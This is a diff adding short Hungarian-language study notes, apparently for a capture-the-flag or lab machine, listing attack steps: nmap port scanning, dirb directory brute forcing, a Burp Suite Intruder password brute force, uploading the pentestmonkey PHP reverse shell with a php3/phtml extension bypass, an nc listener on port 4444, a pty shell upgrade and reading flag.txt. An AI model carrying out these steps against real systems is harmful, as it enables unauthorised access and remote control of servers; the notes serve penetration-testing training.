@@ -1,0 +1,44 @@
+1. sudo nmap -sS -sV -p- -T4 10.0.10.15
+
+ célpont gép nyitott portjainak megtekintése, valszeg 80-as nyitott
+
+3. dirb http://10.0.0.0:80/ /usr/share/wordlists/dirb/common.txt -r
+
+ ezzel megtudod nézni az adott oldalon al oldalakat pl /login /search valszeg a /robots.txt ben lesz a jelszó 
+
+5. jelszavakat bele teszed egy gini szöveges fileba
+
+6. oldalon jobb klik inspect lesz egy felhasználónév kommentbe  valszeg itt: http://10.0.0.0:80/
+
+7. terminálba: burpsuite böngészőbe foxy proxy bekapcsolása miközben megvan nyitva a burp
+
+	burpsuitba intercept on 
+
+8. oladlon megpróbálsz bejelentkezni, ezt elkapja a burp és jobb klikk -> send to intruder nyomsz egy cleart,(positions nél) passwordnél 
+kijelölöd $jel közötti részt aztán add aztán átmész (payloads) load-olod a jelszó szoveges fileod start attack 
+miután megvannak ezek nyomd ki a burp ot és foxy proxyt h ne kapjon el mindent
+
+9. ezután a megadott jelszóval bejelntkezel
+
+
+1. miután bejelnetkeztél uploadolod a gtihub repobol kimasolt source kód szoveges filet
+, ha nem engedi akkor írd árt a kiterjesztést php3-ra vagy phtml-re
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+2. dirbuster
+
+3. be recursive kikapcs file with list of ... /usr/share/wordlists/dirb/common.txt
+
+4. nyitsz egy uj terminált aztán futtatod: nc -lvnp 4444
+
+5. menj el az adott oldalra, ahol a reverse shell ed van van
+
+6. lefuttatod azon a terminálon ahol a listener van
+python3 -c "import pty;pty.spawn('/bin/bash')
+
+www-data@10.10.10.0
+whoami
+cat flag.txt
+
+https://10.0.0.123:1234/
